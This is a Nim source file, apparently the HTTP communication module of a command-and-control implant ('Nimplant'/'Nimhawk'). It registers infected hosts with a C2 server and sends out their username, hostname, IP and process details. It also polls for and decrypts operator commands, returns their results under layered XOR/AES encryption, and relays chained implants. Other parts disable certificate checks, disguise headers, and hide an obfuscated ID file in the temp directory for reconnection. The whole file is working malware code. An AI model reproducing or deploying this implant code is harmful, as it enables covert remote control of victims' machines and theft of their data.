#[
    Infrastructure Adapter: HttpClientAdapter
    Replaces core/webClientListener.nim with hexagonal architecture
    Handles all HTTP communication with C2 server
]#

import base64, json, puppy, tables, os, times, random, sequtils
from strutils import split, toLowerAscii, replace, strip, startsWith, toHex, endsWith
import ../util/crypto
import ../util/strenc
import ../util/sysinfo
import ../../infrastructure/config/config_loader
import ../entities/listener_entity

# Re-export Response type for compatibility
type
    Response* = puppy.Response

# Forward declarations for persistence (moved to separate module later)
proc storeImplantID*(id: string)
proc getStoredImplantID*(): string  
proc removeStoredImplantID()

# Debug function to analyze key decoding
proc debugKeyDecoding(keyStr: string, keyBytes: string, xorKey: int): void =
    when defined verbose:
        echo obf("DEBUG: Received key (base64): ") & keyStr
        echo obf("DEBUG: Decoded key length: ") & $keyBytes.len
        echo obf("DEBUG: First 10 bytes as hex: ")
        for i in 0..<(if keyBytes.len < 10: keyBytes.len else: 10):
            echo obf("  [") & $i & obf("]: 0x") & keyBytes[i].byte.toHex()
        echo obf("DEBUG: Attempting XOR with INITIAL_XOR_KEY: ") & $xorKey

type
    HttpClientAdapter* = object
        ## HTTP client adapter for C2 communication
        discard

proc newHttpClientAdapter*(): HttpClientAdapter =
    ## Create a new HttpClientAdapter instance
    result = HttpClientAdapter()

# HTTP request function using puppy for all architectures
proc doRequest(entity: ListenerEntity, path: string, postKey: string = "", postValue: string = "", verb: string = "get"): puppy.Response =
    try:
        when defined verbose:
            echo obf("DEBUG: doRequest() - Using puppy")
            echo obf("DEBUG: doRequest() - listenerType: ") & entity.listenerType
            echo obf("DEBUG: doRequest() - listenerHost: ") & entity.listenerHost
            echo obf("DEBUG: doRequest() - implantCallbackIp: ") & entity.implantCallbackIp
            echo obf("DEBUG: doRequest() - listenerPort: ") & entity.listenerPort
            echo obf("DEBUG: doRequest() - path: ") & path
        
        # Determine target: Either "TYPE://HOST:PORT" or "TYPE://HOSTNAME"
        var target: string = toLowerAscii(entity.listenerType) & "://"
        if entity.listenerHost != "":
            target = target & entity.listenerHost
        else:
            target = target & entity.implantCallbackIp & ":" & entity.listenerPort
        target = target & path

        when defined verbose:
            echo obf("DEBUG: doRequest() - target URL: ") & target

        # Get the workspace_uuid from the configuration
        let config = parseConfig()
        var workspace_uuid = ""
        let workspace_key = obf("workspace_uuid")
        
        try:
            for k, v in pairs(config):
                if k == workspace_key:
                    workspace_uuid = v
                    break
        except:
            when defined verbose:
                echo obf("DEBUG: Error accessing workspace_uuid in config")

        when defined verbose:
            echo obf("DEBUG: doRequest() - workspace_uuid: ") & workspace_uuid

        # GET request
        if (postKey == "" or postValue == "" and path != entity.reconnectPath):
            when defined verbose:
                echo obf("DEBUG: doRequest() - Preparing GET request")
            
            var headers: seq[Header]

            # Only send ID header once listener is registered
            if entity.id != "":
                headers = @[
                        Header(key: "X-Request-ID", value: entity.id),
                        Header(key: "User-Agent", value: entity.userAgent),
                        Header(key: "Content-Type", value: "application/json"),
                        Header(key: "X-Correlation-ID", value: entity.httpAllowCommunicationKey),    
                    ]
            else:
                headers = @[
                        Header(key: "User-Agent", value: entity.userAgent),
                        Header(key: "X-Correlation-ID", value: entity.httpAllowCommunicationKey),
                        Header(key: "Content-Type", value: "application/json")
                    ]
            
            # Add workspace_uuid header if provided
            if workspace_uuid != "":
                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                
                when defined verbose:
                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid

            let parsedUrl = parseUrl(target)
            let req = Request(
                url: parsedUrl,
                verb: verb,
                headers: headers,
                allowAnyHttpsCertificate: true,
                )

            when defined verbose:
                echo obf("DEBUG: doRequest() - About to fetch()")
                echo obf("DEBUG: doRequest() - Request details:")
                echo obf("  URL: ") & $req.url
                echo obf("  Verb: ") & req.verb
                echo obf("  Headers count: ") & $req.headers.len

            let fetchResult = fetch(req)
            
            when defined verbose:
                echo obf("DEBUG: doRequest() - fetch() completed successfully")
                echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
                
            return fetchResult

        # POST request
        else:
            when defined verbose:
                echo obf("DEBUG: doRequest() - Preparing POST request")
            
            var post_body = "{\"" & postKey & "\":\"" & postValue & "\"}"
            if verb == "options":
                post_body = ""
            
            var headers = @[
                    Header(key: "X-Request-ID", value: entity.id),
                    Header(key: "User-Agent", value: entity.userAgent),
                    Header(key: "Content-Type", value: "application/json"),
                    Header(key: "X-Correlation-ID", value: entity.httpAllowCommunicationKey)
                ]
            
            # Add workspace_uuid header if provided
            if workspace_uuid != "":
                headers.add(Header(key: "X-Robots-Tag", value: workspace_uuid))
                
                when defined verbose:
                    echo obf("DEBUG: Added workspace_uuid to header: ") & workspace_uuid
            
            let parsedUrl = parseUrl(target)
            let req = Request(
                url: parsedUrl,
                verb: verb,
                headers: headers,
                allowAnyHttpsCertificate: true,
                body: post_body
                )
            
            when defined verbose:
                echo obf("DEBUG: doRequest() - About to fetch() for POST")

            let fetchResult = fetch(req)
            
            when defined verbose:
                echo obf("DEBUG: doRequest() - POST fetch() completed successfully")
                echo obf("DEBUG: doRequest() - Response code: ") & $fetchResult.code
                
            return fetchResult

    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: doRequest() - Exception caught: ") & e.msg
            echo obf("DEBUG: doRequest() - Exception type: ") & $e.name
        
        # Return error response
        var errResponse = puppy.Response()
        errResponse.code = 500
        return errResponse

# Init Implant ID and cryptographic key via GET request to the registration path
proc init*(adapter: HttpClientAdapter, entity: var ListenerEntity): void =
    ## Initialize implant by getting ID and encryption key from C2
    let config = parseConfig()
    var workspace_uuid = ""
    let workspace_key = obf("workspace_uuid")
    
    try:
        for k, v in pairs(config):
            if k == workspace_key:
                workspace_uuid = v
                break
    except:
        when defined verbose:
            echo obf("DEBUG: Error accessing workspace_uuid in config")
    
    when defined verbose:
        if workspace_uuid != "":
            echo obf("DEBUG: Using workspace_uuid: ") & workspace_uuid
        echo obf("DEBUG: Attempting to connect to ") & toLowerAscii(entity.listenerType) & "://" & 
             (if entity.listenerHost != "": entity.listenerHost else: entity.implantCallbackIp & ":" & entity.listenerPort) & 
             entity.registerPath

    var res = doRequest(entity, entity.registerPath)
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        if res.code != 200:
            echo obf("DEBUG: Response body: ") & res.body
        
    if res.code == 200:
        entity.id = parseJson(res.body)["id"].getStr()
        
        # Debug key decoding process
        let keyStr = parseJson(res.body)["k"].getStr()
        let keyBytesRaw = base64.decode(keyStr)
        debugKeyDecoding(keyStr, keyBytesRaw, INITIAL_XOR_KEY)
        
        # Convert base64 decoded string to byte sequence safely
        let keyByteSeq = convertToByteSeq(keyBytesRaw)
        entity.uniqueXorKey = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
        entity.initialized = true
        
        when defined verbose:
            echo obf("DEBUG: ID stored in registry: ") & entity.id
    else:
        entity.initialized = false

# Initial registration function, including key init
proc postRegisterRequest*(adapter: HttpClientAdapter, entity: var ListenerEntity, ipAddrInt: string, username: string, hostname: string, osBuild: string, pid: int, pname: string, riskyMode: bool, relayRole: string = "STANDARD"): void =
    ## Post registration request to C2 server
    when defined verbose:
        echo obf("DEBUG: Sending registration request with ID: ") & entity.id
        echo obf("DEBUG: Relay role: ") & relayRole
    
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode,
                "R": relayRole
            }
        ]
    var dataStr = ($data)[1..^2]
    
    when defined verbose:
        echo obf("DEBUG: Data to send (unencrypted): ") & dataStr
    
    let encryptedData = encryptData(dataStr, entity.uniqueXorKey)
    
    when defined verbose:
        echo obf("DEBUG: Encrypted data (first 20 characters): ") & 
             (if encryptedData.len > 20: encryptedData[0..19] else: encryptedData) & "..."
    
    let res = doRequest(entity, entity.registerPath, "data", encryptedData, "post")
    
    when defined verbose:
        echo obf("DEBUG: Response code: ") & $res.code
        echo obf("DEBUG: Response body: ") & 
             (if res.body.len > 0: res.body else: "<empty>")
    
    if (res.code != 200):
        entity.registered = false
        
        when defined verbose:
            echo obf("DEBUG: ERROR - Registration failed. Possible cause: XOR key mismatch.")
            echo obf("DEBUG: Headers sent:")
            echo obf("  X-Request-ID: ") & entity.id
            echo obf("  User-Agent: ") & entity.userAgent
            echo obf("  X-Correlation-ID: ") & entity.httpAllowCommunicationKey
    else:
        entity.registered = true
        
        when defined verbose:
            echo obf("DEBUG: Registration successful. Implant now registered with ID: ") & entity.id

# Relay forwarding registration function
proc postRelayRegisterRequest*(adapter: HttpClientAdapter, entity: var ListenerEntity, relayClientID: string, ipAddrInt: string, username: string, hostname: string, osBuild: string, pid: int, pname: string, riskyMode: bool, relayRole: string = "RELAY_CLIENT"): (string, string) =
    ## Forward registration for relay client
    when defined verbose:
        echo obf("DEBUG: Forwarding relay registration with relay client ID: ") & relayClientID
        echo obf("DEBUG: Relay role: ") & relayRole
    
    var data = %*
        [
            {
                "i": ipAddrInt,
                "u": username,
                "h": hostname,
                "o": osBuild,
                "p": pid,
                "P": pname,
                "r": riskyMode,
                "R": relayRole
            }
        ]
    var dataStr = ($data)[1..^2]
    
    when defined verbose:
        echo obf("DEBUG: Relay forwarding data (unencrypted): ") & dataStr
    
    # Create a temporary entity with the relay client's ID for this request
    var tempEntity = entity
    tempEntity.id = relayClientID
    
    # First, initialize the relay client in the C2 (GET request)
    when defined verbose:
        echo obf("DEBUG: Initializing relay client in C2: ") & relayClientID
    
    var initRes = doRequest(tempEntity, entity.registerPath)
    
    when defined verbose:
        echo obf("DEBUG: Relay client init response code: ") & $initRes.code
        if initRes.code != 200:
            echo obf("DEBUG: Relay client init response body: ") & initRes.body
    
    if initRes.code == 200:
        # Parse the response to get the encryption key for this relay client
        let responseJson = parseJson(initRes.body)
        let clientId = responseJson["id"].getStr()
        let keyStr = responseJson["k"].getStr()
        
        when defined verbose:
            echo obf("DEBUG: Relay client got ID from C2: ") & clientId
            echo obf("DEBUG: Relay client got key from C2 (length: ") & $keyStr.len & ")"
          
        # Decode and XOR the key
        let keyBytesRaw = base64.decode(keyStr)
        let keyByteSeq = convertToByteSeq(keyBytesRaw)
        let clientKey = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
        
        # Now encrypt the registration data with the relay client's key
        let encryptedData = encryptData(dataStr, clientKey)
        
        when defined verbose:
            echo obf("DEBUG: Relay client data encrypted with client key")
        
        # Send the POST registration with the relay client's ID and key
        tempEntity.id = clientId
        let res = doRequest(tempEntity, entity.registerPath, "data", encryptedData, "post")
        
        when defined verbose:
            echo obf("DEBUG: Relay forwarding response code: ") & $res.code
            echo obf("DEBUG: Relay forwarding response body: ") & 
                 (if res.body.len > 0: res.body else: "<empty>")
        
        if res.code == 200:
            when defined verbose:
                echo obf("DEBUG: Relay client registration forwarded successfully with ID: ") & clientId
            return (clientId, clientKey)
        else:
            when defined verbose:
                echo obf("DEBUG: ERROR - Relay client registration failed")
            return ("", "")
    else:
        when defined verbose:
            echo obf("DEBUG: ERROR - Failed to initialize relay client in C2")
        return ("", "")

# Watch for queued commands via GET request to the task path
proc getQueuedCommand*(adapter: HttpClientAdapter, entity: ListenerEntity): (string, string, seq[string]) =
    ## Get queued command from C2 server
    when defined verbose:
        echo obf("DEBUG: getQueuedCommand() called for implant ID: ") & entity.id
        echo obf("DEBUG: getQueuedCommand() request target: ") & entity.taskPath
    
    var 
        res = doRequest(entity, entity.taskPath)
        cmdGuid: string
        cmd: string
        args: seq[string]

    when defined verbose:
        echo obf("DEBUG: getQueuedCommand() response code: ") & $res.code
        echo obf("DEBUG: getQueuedCommand() response body: ") & 
             (if res.body.len > 200: res.body[0..199] & "..." else: res.body)

    # A connection error occurred
    if res.code != 200:
        cmd = obf("NIMPLANT_CONNECTION_ERROR")
        when defined verbose:
            echo obf("DEBUG: Connection error, got status code: "), res.code
    else:
        try:
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() attempting to parse response...")
            
            let responseJson = parseJson(res.body)
            
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() parsed JSON keys: ") & $responseJson.keys().toSeq()
            
            if responseJson.hasKey("t"):
                let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
                
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() - Using layered decryption for ") & myRole
                
                let encryptedTask = responseJson["t"].getStr()
                let base64Decoded = base64.decode(encryptedTask)
                
                # Step 1: XOR decrypt (envelope layer)
                let xorDecrypted = xorString(base64Decoded, INITIAL_XOR_KEY)
                
                # Step 2: Re-encode XOR-decrypted data to base64 (decryptData expects base64 input)
                let xorDecryptedBase64 = base64.encode(xorDecrypted)
                
                # Step 3: AES decrypt (content layer)
                let decryptedTask = decryptData(xorDecryptedBase64, entity.uniqueXorKey)
                
                when defined verbose:
                    echo obf("DEBUG: getQueuedCommand() decrypted task: ") & decryptedTask
                
                let taskJson = parseJson(decryptedTask)
                cmdGuid = taskJson["guid"].getStr()
                cmd = taskJson["command"].getStr()
                
                if taskJson.hasKey("args"):
                    for arg in taskJson["args"]:
                        args.add(arg.getStr())
            else:
                cmd = obf("NO_COMMANDS")
                cmdGuid = ""
                
        except Exception as e:
            when defined verbose:
                echo obf("DEBUG: getQueuedCommand() exception: ") & e.msg
            cmd = obf("ERROR: ") & e.msg
            cmdGuid = ""

    result = (cmdGuid, cmd, args)

# Return command results via POST request to the result path
proc postCommandResults*(adapter: HttpClientAdapter, entity: ListenerEntity, cmdGuid: string, output: string): void =
    ## Post command results to C2 server
    var data = obf("{\"guid\": \"") & cmdGuid & obf("\", \"result\":\"") & base64.encode(output) & obf("\"}")
    
    let myRole = when defined(RELAY_ADDRESS): "RELAY_CLIENT" else: "STANDARD"
    
    when defined debug:
        echo "[DEBUG] 📡 HTTP: Using layered encryption (AES → XOR) for " & myRole & " result"
    
    # Step 1: AES encrypt (content layer)
    let aesEncrypted = encryptData(data, entity.uniqueXorKey)
    # Step 2: XOR encrypt (envelope layer)
    let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
    let encryptedData = base64.encode(xorEncrypted)
    
    discard doRequest(entity, entity.resultPath, "data", encryptedData, "post")

# Reconnect to C2 server
proc reconnect*(adapter: HttpClientAdapter, entity: var ListenerEntity): void =
    ## Reconnect implant to C2 server
    let storedId = getStoredImplantID()
    
    if storedId != "":
        entity.id = storedId
        
        when defined verbose:
            echo "DEBUG: Attempting to reconnect with ID retrieved from registry: " & entity.id
        
        var res = doRequest(entity, entity.reconnectPath, "", "", "options")
        
        when defined verbose:
            echo obf("DEBUG: Reconnection response. Code: ") & $res.code
        
        if res.code == 410:
            when defined verbose:
                echo obf("DEBUG: Server indicates implant is inactive, will register as new implant")
            
            entity.id = ""
            entity.initialized = false
            entity.registered = false
            removeStoredImplantID()
            
            when defined verbose:
                echo obf("DEBUG: Cleared implant data and registry entry for new registration")
            
            return
        
        if res.code == 200:
            if res.body.len > 0:
                try:
                    let keyStr = parseJson(res.body)["k"].getStr()
                    let keyBytesRaw = base64.decode(keyStr)
                    debugKeyDecoding(keyStr, keyBytesRaw, INITIAL_XOR_KEY)
                    
                    let keyByteSeq = convertToByteSeq(keyBytesRaw)
                    entity.uniqueXorKey = xorBytes(keyByteSeq, INITIAL_XOR_KEY)
                    when defined verbose:
                        echo obf("DEBUG: New cryptographic key obtained from server")
                except:
                    when defined verbose:
                        echo obf("DEBUG: Could not obtain new cryptographic key")
            
            entity.initialized = true
            
            # Perform check-in after reconnecting
            when defined verbose:
                echo obf("DEBUG: Performing initial check-in after reconnection")
            
            let (cmdGuid, cmd, args) = adapter.getQueuedCommand(entity)
            entity.registered = true
            
            when defined verbose:
                echo obf("DEBUG: Successful reconnection with stored ID")
        else:
            entity.id = ""
            entity.initialized = false
            entity.registered = false
            when defined verbose:
                echo obf("DEBUG: Reconnection failed, will request a new ID")

# Post chain info to C2
proc postChainInfo*(adapter: HttpClientAdapter, entity: ListenerEntity, myGuid: string, parentGuid: string = "", myRole: string = "STANDARD", listeningPort: int = 0): void =
    ## Post chain information to C2 server
    try:
        when defined debug:
            echo "[DEBUG] 📡 HTTP: === SENDING CHAIN INFO TO C2 ==="
            echo "[DEBUG] 📡 HTTP: - Implant GUID: " & myGuid
        
        let hostname = getSysHostname()
        let username = getUsername()
        let internalIP = getLocalIP()
        let osInfo = getOSInfo()
        let processName = getCurrentProcessName()
        let pid = getCurrentPID()
        
        let chainData = %*{
            "type": "chain_info",
            "nimplant_guid": myGuid,
            "parent_guid": if parentGuid == "": newJNull() else: %parentGuid,
            "my_role": myRole,
            "listening_port": listeningPort,
            "timestamp": epochTime().int64,
            "system_info": {
                "hostname": hostname,
                "username": username,
                "internal_ip": internalIP,
                "os_build": osInfo,
                "process_name": processName,
                "pid": pid
            },
            "connection_health": {
                "active": entity.registered,
                "last_checkin": epochTime().int64,
                "connection_type": if parentGuid == "": "DIRECT_C2" else: "RELAYED"
            }
        }
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: Enhanced chain data: " & $chainData
        
        # Layered encryption: AES → XOR
        when defined debug:
            echo "[DEBUG] 📡 HTTP: - Using layered encryption (AES → XOR) for " & myRole
        
        let aesEncrypted = encryptData($chainData, entity.uniqueXorKey)
        let xorEncrypted = xorString(aesEncrypted, INITIAL_XOR_KEY)
        let encryptedData = base64.encode(xorEncrypted)
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: - Sending POST request to /chain endpoint..."
        
        let response = doRequest(entity, "/chain", "data", encryptedData, "post")
        
        when defined debug:
            echo "[DEBUG] 📡 HTTP: - Response code: " & $response.code
            echo "[DEBUG] 📡 HTTP: === END CHAIN INFO SEND ==="
                
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 📡 HTTP: ❌ Error sending chain info: " & e.msg

# Cross-platform persistence functions (temporary - will be moved to separate module)
randomize()

proc validateNimhawkPattern(line: string): bool =
    if line.len < 32:
        return false
    let colonParts = line.split(":")
    if colonParts.len != 2:
        return false
    let patternPart = colonParts[0]
    let idPart = colonParts[1]
    if idPart.len == 0:
        return false
    let parts = patternPart.split("-")
    if parts.len != 5:
        return false
    try:
        if parts[0].len != 4:
            return false
        for c in parts[0]:
            if not (c >= '0' and c <= '9'):
                return false
        if parts[1].len != 4:
            return false
        for c in parts[1]:
            if not (c >= 'a' and c <= 'z'):
                return false
        if parts[2].len != 5:
            return false
        for c in parts[2]:
            if not (c >= '0' and c <= '9'):
                return false
        if parts[3].len != 4:
            return false
        for c in parts[3]:
            if not (c >= 'A' and c <= 'Z'):
                return false
        if parts[4].len != 5:
            return false
        for c in parts[4]:
            if not (c >= 'a' and c <= 'z'):
                return false
        return true
    except:
        return false

proc generateNimhawkPattern(): string =
    let numbers = rand(1000..9999)
    var lowercase1 = ""
    for i in 0..3:
        lowercase1.add(char(rand('a'..'z')))
    let numbers2 = rand(10000..99999)
    var uppercase = ""
    for i in 0..3:
        uppercase.add(char(rand('A'..'Z')))
    var lowercase2 = ""
    for i in 0..4:
        lowercase2.add(char(rand('a'..'z')))
    return $numbers & "-" & lowercase1 & "-" & $numbers2 & "-" & uppercase & "-" & lowercase2

proc getTempDirPath(): string =
    try:
        return os.getTempDir()
    except:
        return "/tmp"

proc generateRandomFilename(): string =
    let prefix = "."
    let suffix = ".dat"
    let randomPart = $rand(100000..999999)
    return prefix & randomPart & suffix

proc findNimhawkFile(): string =
    let tempDir = getTempDirPath()
    for kind, path in walkDir(tempDir):
        if kind == pcFile and '.' in path and path.endsWith(".dat"):
            try:
                let content = readFile(path).strip()
                if validateNimhawkPattern(content):
                    return path
            except:
                discard
    return ""

proc createPersistenceFile(): string =
    let tempDir = getTempDirPath()
    let fallbackName = generateRandomFilename()
    return joinPath(tempDir, fallbackName)

proc storeImplantID*(id: string) =
    try:
        let existingFile = findNimhawkFile()
        if existingFile != "":
            try:
                removeFile(existingFile)
            except:
                discard
        let persistPath = createPersistenceFile()
        let obfuscatedId = xorString(id, INITIAL_XOR_KEY)
        let encodedId = base64.encode(obfuscatedId)
        let pattern = generateNimhawkPattern()
        let content = pattern & ":" & encodedId
        writeFile(persistPath, content)
    except:
        discard

proc getStoredImplantID*(): string =
    try:
        let persistPath = findNimhawkFile()
        if persistPath == "":
            return ""
        let content = readFile(persistPath).strip()
        if not validateNimhawkPattern(content):
            return ""
        let colonParts = content.split(":")
        if colonParts.len != 2:
            return ""
        let encodedId = colonParts[1]
        let obfuscatedId = base64.decode(encodedId)
        let id = xorString(obfuscatedId, INITIAL_XOR_KEY)
        return id
    except:
        return ""

proc removeStoredImplantID() =
    try:
        let persistPath = findNimhawkFile()
        if persistPath != "" and fileExists(persistPath):
            removeFile(persistPath)
    except:
        discard

# Kill self - announce that kill timer has expired
proc killSelf*(adapter: HttpClientAdapter, entity: ListenerEntity): void =
    ## Announce that the kill timer has expired
    if entity.initialized:
        postCommandResults(adapter, entity, "", obf("NIMPLANT_KILL_TIMER_EXPIRED"))
        
        # Clean up registry entry
        when defined verbose:
            echo obf("DEBUG: Kill timer expired, removing implant ID from registry")
        removeStoredImplantID()
        when defined verbose:
            echo obf("DEBUG: Successfully removed implant ID from storage on self-kill")

# Send raw data to C2 server endpoint
proc postRawData*(adapter: HttpClientAdapter, entity: ListenerEntity, endpoint: string, data: string): void =
    ## Send raw data to C2 server endpoint
    when defined debug:
        echo "[HTTP] 📡 Sending raw data to C2 endpoint: " & endpoint
        echo "[HTTP] 📡 Data length: " & $data.len
    
    try:
        let response = doRequest(entity, endpoint, "data", data, "post")
        when defined debug:
            echo "[HTTP] 📡 Response code: " & $response.code
            if response.code != 200:
                echo "[HTTP] 📡 Response body: " & response.body
    except Exception as e:
        when defined debug:
            echo "[HTTP] 📡 Error sending raw data: " & e.msg

# Proxy request handler for HTTP Proxy system
proc postProxyRequest*(adapter: HttpClientAdapter, entity: ListenerEntity, data: string): string =
    ## Proxy request handler for HTTP Proxy system
    when defined debug:
        echo "[DEBUG] 📡 HTTP PROXY: === SENDING PROXY REQUEST ==="
        echo "[DEBUG] 📡 HTTP PROXY: - Data length: " & $data.len
    
    try:
        let response = doRequest(entity, "/proxy", "data", data, "post")
        when defined debug:
            echo "[DEBUG] 📡 HTTP PROXY: - Response code: " & $response.code
            if response.body != "":
                echo "[DEBUG] 📡 HTTP PROXY: - Response: " & response.body
        
        if response.code == 200:
            return response.body
        else:
            return "ERROR: HTTP " & $response.code
            
    except Exception as e:
        when defined debug:
            echo "[DEBUG] 📡 HTTP PROXY: ❌ Error sending proxy request: " & e.msg
        return "ERROR: " & e.msg

